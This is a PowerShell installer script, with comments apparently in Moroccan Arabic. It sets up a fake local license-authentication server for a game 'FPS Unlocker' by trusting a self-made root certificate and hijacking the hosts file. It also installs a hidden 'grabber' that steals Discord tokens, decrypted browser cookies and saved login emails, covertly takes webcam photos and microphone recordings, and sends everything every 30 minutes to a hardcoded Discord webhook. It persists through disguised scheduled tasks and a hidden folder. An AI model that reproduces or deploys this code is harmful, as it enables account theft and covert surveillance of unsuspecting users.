<#3V
  sevenauthapi.com local fake-auth + discord grabber (all-in-one, autostart, hidden)

  Run  : irm -useb https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1 | iex
  Undo : irm -useb https://raw.githubusercontent.com/MarcoCOdev1/d/main/uninstall.ps1 | iex

  Kay bni C:\seven, kay instali cryptography + requests, kay generi w trusti root
  cert l sevenauthapi.com, kay ridirecti l domaine l 127.0.0.1, kay bni launcher
  fakeauth.exe b icon, w kay sajjel jouj tasks (server + grabber) f logon.
#>

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Source = 'https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1'

# ---------- relance mn fichier (here-strings safe f iex) ----------
$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $PSCommandPath) {
    $tmp = Join-Path $env:TEMP 'seven-install.ps1'
    Invoke-WebRequest -UseBasicParsing $Source -OutFile $tmp
    if (-not $admin) { Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$tmp`"") }
    else { & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp }
    Write-Host 'Relance...' -ForegroundColor Yellow
    return
}
if (-not $admin) {
    Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`"")
    Write-Host 'UAC tlob — 9bel w kemmel f l window jdida.' -ForegroundColor Yellow
    return
}

$Root   = 'C:\seven'
$Hosts  = Join-Path $env:windir 'System32\drivers\etc\hosts'
$Domain = 'sevenauthapi.com'
$TaskS  = 'FakeAuth'
$TaskG  = 'FakeAuthGrab'
$Launcher = Join-Path $Root 'fakeauth.exe'
$IconUrl  = 'https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg'

# ================= 00 - cleanup =================
Write-Host '>> 00 cleanup qdim' -ForegroundColor Cyan
foreach ($t in $TaskS, $TaskG, 'sevenauthapi-fake') {
    Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue
}
Get-CimInstance Win32_Process -Filter "Name='python.exe' OR Name='pythonw.exe' OR Name='fakeauth.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -match 'fake\.py|run\.py|grab\.py' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Get-ChildItem Cert:\CurrentUser\Root -ErrorAction SilentlyContinue |
    Where-Object { $_.Subject -like "*CN=$Domain*" } | Remove-Item -Force -ErrorAction SilentlyContinue

# ================= 01 - folder + deps =================
Write-Host '>> 01 folder + deps' -ForegroundColor Cyan
$py = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $py) { throw 'python ma kaynch f PATH' }
$pyw = Join-Path (Split-Path $py.Source) 'pythonw.exe'
if (-not (Test-Path $pyw)) { $pyw = $py.Source }

if (Test-Path $Root) {
    $bak = "$Root.bak." + (Get-Date -Format 'yyyyMMdd-HHmmss')
    Rename-Item $Root $bak; Write-Host "   $Root -> $bak" -ForegroundColor DarkYellow
}
New-Item -ItemType Directory -Path $Root | Out-Null
Set-Location $Root
python -m pip install cryptography requests --disable-pip-version-check --quiet

# ================= 02 - makecert.py =================
$makecert = @'
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "sevenauthapi.com")])
now = datetime.datetime.now(datetime.timezone.utc)

c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
     .public_key(k.public_key()).serial_number(x509.random_serial_number())
     .not_valid_before(now - datetime.timedelta(days=1))
     .not_valid_after(now + datetime.timedelta(days=3650))
     .add_extension(x509.SubjectAlternativeName([
         x509.DNSName("sevenauthapi.com"), x509.DNSName("*.sevenauthapi.com")]), False)
     .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
     .sign(k, hashes.SHA256()))

open("cert.pem","wb").write(
    k.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption()) + c.public_bytes(serialization.Encoding.PEM))
open("seven.cer","wb").write(c.public_bytes(serialization.Encoding.DER))
print("OK")
'@

# ================= 02b - run.py =================
$runner = @'
import os, sys, time
os.chdir(os.path.dirname(os.path.abspath(__file__)))
log = "server.log"
try:
    if os.path.getsize(log) > 2 * 1024 * 1024:
        os.replace(log, "server.old.log")
except OSError:
    pass
f = open(log, "a", encoding="utf-8", buffering=1)
sys.stdout = f; sys.stderr = f
print(""); print("=== start", time.strftime("%Y-%m-%d %H:%M:%S"), "pid", os.getpid(), "===")
exec(compile(open("fake.py", encoding="utf-8").read(), "fake.py", "exec"), {"__name__": "__main__"})
'@

# ================= 04 - fake.py =================
$fake = @'
import ssl, json, base64, hashlib, time, uuid, secrets
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

YEAR = 365 * 24 * 3600 * 1000

def token(hwid):
    now = int(time.time() * 1000)
    p = {"k": secrets.token_hex(12),
         "h": hashlib.sha256(hwid.encode()).hexdigest()[:24],
         "c": secrets.token_hex(8),
         "e": now + 10 * YEAR}
    b = base64.urlsafe_b64encode(json.dumps(p, separators=(",", ":")).encode()).decode().rstrip("=")
    sig = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
    return b + "." + sig

class H(BaseHTTPRequestHandler):
    daemon_threads = True
    def do_GET(self): self.x()
    def do_POST(self): self.x()
    def x(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n)
        print(">>>", self.path, raw)
        try: req = json.loads(raw or b"{}")
        except: req = {}
        now = int(time.time() * 1000)
        body = {"success": True, "message": "Authorized", "data": {
            "product": {"id": "6ac401b8ca0d96ab19f8c388", "name": "FPS Unlocker",
                        "hash": req.get("productHash", "")},
            "username": req.get("username", "user"),
            "sessionToken": token(req.get("hwid", "")),
            "expiresAt": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime((now + 10 * YEAR) / 1000)),
            "expiresAtUnix": now + 10 * YEAR,
            "daysLeft": 3650,
            "serverTimeUnix": now,
            "secondsLeft": 10 * YEAR // 1000,
            "config": None},
            "requestId": str(uuid.uuid4()),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(now / 1000))}
        b = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("x-censor-enabled", "1")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def log_message(self, fmt, *a): pass

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem")
s = ThreadingHTTPServer(("0.0.0.0", 443), H)
s.socket = ctx.wrap_socket(s.socket, server_side=True)
print("fake :443")
s.serve_forever()
'@

# ================= cam.ps1 =================
$cam = @'
param([string]$Out)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Runtime.WindowsRuntime
function Await($op, $t) {
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
  } | Select-Object -First 1
  $task = $m.MakeGenericMethod($t).Invoke($null, @($op))
  if (-not $task.Wait(20000)) { throw 'timeout' }
  $task.Result
}
[Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime]|Out-Null
[Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime]|Out-Null
[Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media.MediaProperties,ContentType=WindowsRuntime]|Out-Null
$mc = New-Object Windows.Media.Capture.MediaCapture
$init = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
$init.StreamingCaptureMode = 'Video'
$t = [System.WindowsRuntimeSystemExtensions]::AsTask($mc.InitializeAsync($init))
if (-not $t.Wait(20000)) { throw 'init timeout' }
$dir  = Split-Path $Out
$leaf = Split-Path $Out -Leaf
$folder = Await ([Windows.Storage.StorageFolder]::GetFolderFromPathAsync($dir)) ([Windows.Storage.StorageFolder])
$file   = Await ($folder.CreateFileAsync($leaf, 'ReplaceExisting')) ([Windows.Storage.StorageFile])
$props  = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
$t2 = [System.WindowsRuntimeSystemExtensions]::AsTask($mc.CapturePhotoToStorageFileAsync($props, $file))
if (-not $t2.Wait(20000)) { throw 'capture timeout' }
$mc.Dispose()
'@

# ================= 05 - grab.py =================
$grab = @'
import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, platform

try:
    import requests
except Exception:
    requests = None

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

WEBHOOK  = "https://canary.discord.com/api/webhooks/1565742577930600448/WyYxTHvWFtKs9zGRNf0d3RvfByTMVrZOnWkhRLnYep_4aq9Kdk11zh9EWc2sWNow63N3"
AVATAR   = "https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg"
INTERVAL = 1800
ROOT = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(ROOT, "data")
STATE = os.path.join(DATA, "state.json")
os.makedirs(DATA, exist_ok=True)

RE_TOKEN = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{80,90}")
SKIP = {"windows", "$recycle.bin", "system volume information", "node_modules", ".git",
        "package cache", "installer", "winsxs", "driverstore", "temp", "tmp"}
DISCORD_DIRS = {"discord": "discord", "discordptb": "discordptb", "discordcanary": "discordcanary"}
BROWSERS = [
    ("Chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
    ("Brave",  os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")),
    ("Edge",   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
]

def log(m):
    try:
        p = os.path.join(ROOT, "grabber.log")
        if os.path.exists(p) and os.path.getsize(p) > 1024 * 1024:
            os.replace(p, p + ".old")
        with open(p, "a", encoding="utf-8") as f:
            f.write("%s  %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), m))
    except Exception:
        pass

# ---------------- DPAPI ----------------
class BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi(data):
    buf = ctypes.create_string_buffer(data, len(data))
    bi = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    bo = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
        return None
    out = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return out

def master_key(user_data):
    ls = os.path.join(user_data, "Local State")
    if not os.path.exists(ls):
        return None
    try:
        raw = json.load(open(ls, "r", encoding="utf-8"))["os_crypt"]["encrypted_key"]
    except Exception:
        return None
    k = dpapi(base64.b64decode(raw)[5:])
    if not k:
        return None
    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=16, salt=b"saltysalt", iterations=1).derive(k)

def dec(blob, key):
    if not key or not blob:
        return ""
    try:
        if blob[:3] in (b"v10", b"v11"):
            return AESGCM(key).decrypt(b" " * 32, blob[3:], None).decode("utf-8", "replace")
        if blob[:3] == b"v20":
            return AESGCM(key).decrypt(b" " * 32, blob[3:], None).decode("utf-8", "replace")
        return dpapi(blob).decode("utf-8", "replace")
    except Exception:
        return ""

def cookies(name, user_data):
    out = []
    key = master_key(user_data)
    profiles = [d for d in os.listdir(user_data) if os.path.isdir(os.path.join(user_data, d))] if os.path.isdir(user_data) else []
    profiles = [p for p in profiles if p == "Default" or p.startswith("Profile")] or ["Default"]
    for prof in profiles:
        for cand in ("Network\\Cookies", "Cookies"):
            src = os.path.join(user_data, prof, cand)
            if not os.path.exists(src):
                continue
            tmp = os.path.join(DATA, "ck.db")
            try:
                shutil.copy2(src, tmp)
                con = sqlite3.connect(tmp)
                rows = con.execute("select host_key,name,encrypted_value,path,expires_utc from cookies").fetchall()
                con.close()
            except Exception:
                continue
            for host, cn, ev, path, exp in rows:
                v = dec(ev, key)
                if v:
                    out.append("%s\t%s\t%s\t%s" % (host, cn, v, path))
    return out

# ---------------- process scan ----------------
def pids_of(names):
    found = set()
    try:
        arr = (ctypes.c_ulong * 2048)()
        need = ctypes.c_ulong()
        ctypes.windll.psapi.EnumProcesses(ctypes.byref(arr), ctypes.sizeof(arr), ctypes.byref(need))
        for pid in arr[: need.value // ctypes.sizeof(ctypes.c_ulong)]:
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if not h:
                continue
            try:
                buf = ctypes.create_unicode_buffer(1024)
                sz = ctypes.c_ulong(1024)
                if ctypes.windll.kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(sz)):
                    p = buf.value
                    if os.path.basename(p).lower() in names:
                        found.add(p)
            finally:
                ctypes.windll.kernel32.CloseHandle(h)
    except Exception:
        pass
    return found

def discord_dirs():
    dirs = set()
    appdata = os.environ.get("APPDATA", "")
    for d in DISCORD_DIRS.values():
        p = os.path.join(appdata, d)
        if os.path.isdir(p):
            dirs.add(p)
    for exe in pids_of({"discord.exe", "discordptb.exe", "discordcanary.exe"}):
        parts = exe.lower().split(os.sep)
        for name in parts:
            if name in DISCORD_DIRS:
                p = os.path.join(appdata, DISCORD_DIRS[name])
                if os.path.isdir(p):
                    dirs.add(p)
        local = os.path.join(os.environ.get("LOCALAPPDATA", ""), "discord")
        if os.path.isdir(local):
            dirs.add(local)
    return dirs

def read_tokens(folder):
    hits = set()
    for dp, dns, fns in os.walk(folder):
        if "leveldb" not in dp.lower() and "network" not in dp.lower():
            dns[:] = [d for d in dns if d.lower() in ("local storage", "leveldb", "network")]
        for fn in fns:
            if not fn.lower().endswith((".ldb", ".log", ".sst")):
                continue
            p = os.path.join(dp, fn)
            try:
                if os.path.getsize(p) > 16 * 1024 * 1024:
                    continue
                blob = open(p, "rb").read().decode("latin-1")
            except Exception:
                continue
            for m in RE_TOKEN.findall(blob):
                hits.add((m, p))
    return hits

def disk_scan(deadline):
    hits = set()
    roots = []
    for d in "CDEFGH":
        r = d + ":\\"
        if os.path.exists(r):
            roots.append(r)
    for root in roots:
        for dp, dns, fns in os.walk(root, topdown=True):
            if time.time() > deadline:
                return hits
            base = os.path.basename(dp).lower()
            dns[:] = [d for d in dns if d.lower() not in SKIP and not d.startswith("$")]
            if base == "leveldb":
                dns[:] = []
                try:
                    for fn in fns:
                        p = os.path.join(dp, fn)
                        if os.path.getsize(p) > 16 * 1024 * 1024:
                            continue
                        blob = open(p, "rb").read().decode("latin-1")
                        for m in RE_TOKEN.findall(blob):
                            hits.add((m, p))
                except Exception:
                    pass
    return hits

# ---------------- validate ----------------
def validate(tok):
    if not requests:
        return None
    try:
        r = requests.get("https://discord.com/api/v9/users/@me",
                         headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            return {"valid": False, "code": r.status_code}
        u = r.json()
        info = {"valid": True, "id": u.get("id"), "username": u.get("username"),
                "global_name": u.get("global_name"), "email": u.get("email"),
                "phone": u.get("phone"), "mfa": u.get("mfa_enabled"),
                "verified": u.get("verified"), "nitro": u.get("premium_type"),
                "flags": u.get("flags"), "locale": u.get("locale")}
        try:
            b = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                             headers={"Authorization": tok}, timeout=15).json()
            info["subs"] = len(b) if isinstance(b, list) else 0
        except Exception:
            pass
        return info
    except Exception as e:
        return {"valid": None, "err": str(e)[:60]}

# ---------------- system ----------------
PS_SPECS = r"""
$o=[ordered]@{}
try{$o.cpu=(Get-CimInstance Win32_Processor).Name -join ' | '}catch{}
try{$o.gpu=(Get-CimInstance Win32_VideoController).Name -join ' | '}catch{}
try{$o.ram_gb=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)}catch{}
try{$o.mobo=((Get-CimInstance Win32_BaseBoard).Manufacturer)+' '+(Get-CimInstance Win32_BaseBoard).Product}catch{}
try{$o.os=(Get-CimInstance Win32_OperatingSystem).Caption+' '+[Environment]::OSVersion.Version}catch{}
try{$o.disks=@(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.Size/1GB))GB/$([math]::Round($_.FreeSpace/1GB))GB free" }) -join ' | '}catch{}
try{$o.wifi=(netsh wlan show interfaces | Select-String '^\s*SSID\s*:') -join ' '}catch{}
try{$o.wifi=(($o.wifi -split ':')[1..99] -join ':').Trim()}catch{}
try{$o.profiles=@(netsh wlan show profiles | Select-String ':\s*(.+)$' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }) -join ', '}catch{}
try{$o.uptime=[int]((Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes}catch{}
$o | ConvertTo-Json -Compress
"""

def specs():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", PS_SPECS],
                           capture_output=True, text=True, timeout=60,
                           creationflags=0x08000000)
        return json.loads(r.stdout.strip() or "{}")
    except Exception as e:
        return {"err": str(e)[:60]}

def pub_ip():
    if not requests:
        return "?"
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            return requests.get(u, timeout=10).text.strip()
        except Exception:
            pass
    return "?"

def local_ips():
    out = set()
    try:
        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
            out.add(ip)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        out.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return ", ".join(sorted(out))

def emails():
    out = set()
    try:
        out.add(os.environ.get("USERNAME", "") + "@" + os.environ.get("USERDNSDOMAIN", os.environ.get("USERDOMAIN", "")))
    except Exception:
        pass
    for name, ud in BROWSERS:
        if not os.path.isdir(ud):
            continue
        for prof in os.listdir(ud):
            src = os.path.join(ud, prof, "Login Data")
            if not os.path.exists(src):
                continue
            tmp = os.path.join(DATA, "ld.db")
            try:
                shutil.copy2(src, tmp)
                con = sqlite3.connect(tmp)
                for (u,) in con.execute("select username_value from logins where username_value like '%@%'"):
                    if u:
                        out.add(u.strip())
                con.close()
            except Exception:
                pass
    return sorted(x for x in out if "@" in x)

# ---------------- media ----------------
def camera():
    out = os.path.join(DATA, "cam.jpg")
    try:
        if os.path.exists(out):
            os.remove(out)
    except Exception:
        pass
    try:
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                        "-File", os.path.join(ROOT, "cam.ps1"), "-Out", out],
                       capture_output=True, timeout=45, creationflags=0x08000000)
    except Exception:
        pass
    if os.path.exists(out) and os.path.getsize(out) > 2000:
        return out
    try:
        subprocess.run(["ffmpeg", "-y", "-f", "dshow", "-i", "video=default", "-frames:v", "1", out],
                       capture_output=True, timeout=30, creationflags=0x08000000)
    except Exception:
        pass
    return out if os.path.exists(out) and os.path.getsize(out) > 2000 else None

def voice(sec=10):
    out = os.path.join(DATA, "voice.wav")
    try:
        if os.path.exists(out):
            os.remove(out)
    except Exception:
        pass
    try:
        mci = ctypes.windll.winmm.mciSendStringW
        buf = ctypes.create_unicode_buffer(512)
        mci("open new type waveaudio alias rec", buf, 512, None)
        mci("set rec time format ms bitspersample 16 channels 1 samplespersec 22050", buf, 512, None)
        mci("record rec", buf, 512, None)
        time.sleep(sec)
        mci("stop rec", buf, 512, None)
        mci('save rec "%s"' % out, buf, 512, None)
        mci("close rec", buf, 512, None)
    except Exception as e:
        log("voice %r" % e)
    return out if os.path.exists(out) and os.path.getsize(out) > 4000 else None

# ---------------- state ----------------
def load_state():
    try:
        return json.load(open(STATE, "r", encoding="utf-8"))
    except Exception:
        return {"tokens": {}}

def save_state(s):
    try:
        json.dump(s, open(STATE, "w", encoding="utf-8"), indent=1)
    except Exception:
        pass

def h(t):
    return hashlib.sha256(t.encode()).hexdigest()[:16]

# ---------------- send ----------------
def send(payload, files):
    if not requests:
        return
    try:
        r = requests.post(WEBHOOK, data={"payload_json": json.dumps(payload)},
                          files=files, timeout=120)
        log("send %s %s" % (r.status_code, r.text[:120]))
    except Exception as e:
        log("send err %r" % e)

# ---------------- cycle ----------------
def cycle():
    t0 = time.time()
    host = socket.gethostname()
    ip = pub_ip()
    st = load_state()
    known = st.setdefault("tokens", {})

    found = set()
    for d in discord_dirs():
        found |= read_tokens(d)
    for name, ud in BROWSERS:
        if os.path.isdir(ud):
            found |= read_tokens(os.path.join(ud, "Default", "Local Storage"))
    found |= disk_scan(t0 + 150)

    tokens = {}
    for tok, src in found:
        if tok not in tokens:
            tokens[tok] = src
    tokens = {k: v for k, v in tokens.items() if len(k) > 50}

    events, lines, users = [], [], []
    for tok, src in tokens.items():
        key = h(tok)
        info = validate(tok) or {}
        prev = known.get(key, {})
        if not prev:
            events.append("NEW")
        elif prev.get("valid") and not info.get("valid"):
            events.append("PATCHED/INVALID")
        if info.get("valid") and prev.get("id") and prev.get("id") != info.get("id"):
            events.append("CHANGED")
        known[key] = {"valid": info.get("valid"), "id": info.get("id"),
                      "user": info.get("username"), "seen": int(time.time())}
        if info.get("valid"):
            users.append("%s (%s)" % (info.get("username"), info.get("id")))
            lines.append("**VALID** `%s`\n> %s | %s | nitro %s | mfa %s\n> `%s`\n> %s"
                         % (info.get("username"), info.get("id"), info.get("email") or "-",
                            info.get("nitro"), info.get("mfa"), tok, src))
        else:
            lines.append("**%s** (HTTP %s)\n> `%s`\n> %s"
                         % ("INVALID" if info.get("valid") is False else "UNVERIFIED",
                            info.get("code", "?"), tok, src))
    save_state(st)

    sp = specs()
    em = emails()
    ck = []
    for name, ud in BROWSERS:
        if os.path.isdir(ud):
            ck += ["# %s" % name] + cookies(name, ud)
    ck_path = os.path.join(DATA, "cookies.txt")
    open(ck_path, "w", encoding="utf-8").write("\n".join(ck))
    cam = camera()
    voc = voice()

    desc = "\n".join(lines)[:4000] or "ma l9itch tokens"
    if events:
        desc = "**%s**\n\n" % ", ".join(sorted(set(events))) + desc

    embeds = [{
        "title": "%s | %s" % (host, ip),
        "description": desc,
        "color": 0x5865F2,
        "fields": [
            {"name": "Device", "value": "`%s` | local %s | uptime %s min" % (host, local_ips(), sp.get("uptime", "?")), "inline": False},
            {"name": "Users", "value": (", ".join(users) or "-")[:1000], "inline": True},
            {"name": "Emails", "value": ("\n".join(em) or "-")[:1000], "inline": True},
            {"name": "WiFi", "value": "`%s`\nprofiles: %s" % (sp.get("wifi") or "-", (sp.get("profiles") or "-")[:600]), "inline": False},
            {"name": "Disks", "value": "`%s`" % (sp.get("disks") or "-"), "inline": False},
            {"name": "Specs", "value": "CPU `%s`\nGPU `%s`\nRAM `%sGB`\n`%s`\n`%s`"
                % (sp.get("cpu"), sp.get("gpu"), sp.get("ram_gb"), sp.get("mobo"), sp.get("os")), "inline": False},
            {"name": "Cookies", "value": "`%d`" % (len(ck) - sum(1 for x in ck if x.startswith("# "))), "inline": True},
        ],
        "footer": {"text": "herox bypass grabber • 30min"},
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
    }]

    files = {}
    if cam:
        files["files[0]"] = ("cam.jpg", open(cam, "rb"))
    if voc:
        files["files[1]"] = ("voice.wav", open(voc, "rb"))
    files["files[2]"] = ("cookies.txt", open(ck_path, "rb"))

    send({"username": "herox bypass grabber", "avatar_url": AVATAR, "embeds": embeds}, files)
    for f in files.values():
        try:
            f[1].close()
        except Exception:
            pass
    log("cycle done in %ds, %d tokens" % (time.time() - t0, len(tokens)))

def main():
    once = "--once" in sys.argv
    while True:
        try:
            cycle()
        except Exception as e:
            log("cycle error %r" % e)
        if once:
            break
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
'@

$utf8 = New-Object System.Text.UTF8Encoding($false)
foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('grab.py',$grab))) {
    [IO.File]::WriteAllText((Join-Path $Root $pair[0]), $pair[1], $utf8)
}

# ================= 03 - cert =================
Write-Host '>> 03 cert' -ForegroundColor Cyan
python makecert.py
if (-not (Test-Path (Join-Path $Root 'seven.cer'))) { throw 'cert failed' }
$c = Import-Certificate -FilePath (Join-Path $Root 'seven.cer') -CertStoreLocation 'Cert:\CurrentUser\Root'
Write-Host "   trusted $($c.Thumbprint)" -ForegroundColor Green

# ================= 04 - hosts =================
Write-Host '>> 04 hosts' -ForegroundColor Cyan
Copy-Item $Hosts (Join-Path $Root 'hosts.bak') -Force
(Get-Content $Hosts) | Where-Object { $_ -notmatch [regex]::Escape($Domain) } | Set-Content $Hosts
Add-Content -Path $Hosts -Value "127.0.0.1 $Domain"
ipconfig /flushdns | Out-Null

# ================= 05 - consent cam/mic =================
Write-Host '>> 05 consent cam/mic' -ForegroundColor Cyan
foreach ($cap in 'webcam','microphone') {
    $k = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\$cap"
    if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
    Set-ItemProperty -Path $k -Name 'Value' -Value 'Allow'
}
Write-Host '   Allow' -ForegroundColor Green

# ================= 06 - launcher + icon =================
Write-Host '>> 06 launcher' -ForegroundColor Cyan
$ico = Join-Path $Root 'fakeauth.ico'
try {
    Invoke-WebRequest -UseBasicParsing $IconUrl -OutFile (Join-Path $Root 'icon.jpg')
    Add-Type -AssemblyName System.Drawing
    $img = [System.Drawing.Image]::FromFile((Join-Path $Root 'icon.jpg'))
    $bmp = New-Object System.Drawing.Bitmap $img, 128, 128
    $hicon = $bmp.GetHicon()
    $icon = [System.Drawing.Icon]::FromHandle($hicon)
    $fs = [IO.File]::Create($ico)
    $icon.Save($fs)
    $fs.Close()
    $img.Dispose(); $bmp.Dispose()
    Write-Host '   icon OK' -ForegroundColor Green
} catch { Write-Host '   icon fail, bla icon' -ForegroundColor DarkYellow }

$cs = Join-Path $Root 'launch.cs'
@"
using System;
using System.Diagnostics;
using System.IO;
class P {
  static void Main(string[] a) {
    string dir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
    string s = a.Length > 0 ? a[0] : "run.py";
    var si = new ProcessStartInfo(@"$pyw", "\"" + Path.Combine(dir, s) + "\"");
    si.WorkingDirectory = dir;
    si.UseShellExecute = false;
    si.CreateNoWindow = true;
    var p = Process.Start(si);
    p.WaitForExit();
  }
}
"@ | Set-Content -Path $cs -Encoding UTF8

$csc = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (Test-Path $csc) {
    $cargs = @('/nologo','/target:winexe',"/out:$Launcher")
    if (Test-Path $ico) { $cargs += "/win32icon:$ico" }
    $cargs += $cs
    & $csc $cargs 2>&1 | Out-Null
}
if (-not (Test-Path $Launcher)) {
    Write-Host '   csc fail -> pythonw direct' -ForegroundColor DarkYellow
    Copy-Item $pyw $Launcher -Force
    $Launcher = $pyw
} else { Write-Host '   fakeauth.exe bni' -ForegroundColor Green }
Remove-Item $cs -Force -ErrorAction SilentlyContinue

# ================= 07 - tasks =================
Write-Host '>> 07 tasks' -ForegroundColor Cyan
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -DontStopOnIdleEnd
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"

foreach ($pair in @(@($TaskS,'run.py','auth service'), @($TaskG,'grab.py','auth update'))) {
    $act = New-ScheduledTaskAction -Execute $Launcher -Argument $pair[1] -WorkingDirectory $Root
    Register-ScheduledTask -TaskName $pair[0] -Action $act -Trigger $trigger -Settings $settings `
        -Principal $principal -Description $pair[2] -Force | Out-Null
}
Write-Host "   $TaskS + $TaskG msajjlin" -ForegroundColor Green

Start-ScheduledTask -TaskName $TaskS
Start-ScheduledTask -TaskName $TaskG
Start-Sleep -Seconds 6

# ================= 08 - hide =================
attrib +h +s $Root
Write-Host '>> 08 folder hidden' -ForegroundColor Cyan

# ================= verification =================
Write-Host ''
Write-Host '--- verification ---' -ForegroundColor Cyan
foreach ($t in $TaskS, $TaskG) { Write-Host "   $t : $((Get-ScheduledTask -TaskName $t).State)" }
if (Get-NetTCPConnection -LocalPort 443 -State Listen -ErrorAction SilentlyContinue) {
    Write-Host '   port 443: LISTEN' -ForegroundColor Green
} else { Write-Host '   port 443: MAKAYNCH — chouf C:\seven\server.log' -ForegroundColor Red }
Start-Sleep -Seconds 3
Get-Content (Join-Path $Root 'grabber.log') -Tail 6 -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }

Write-Host ''
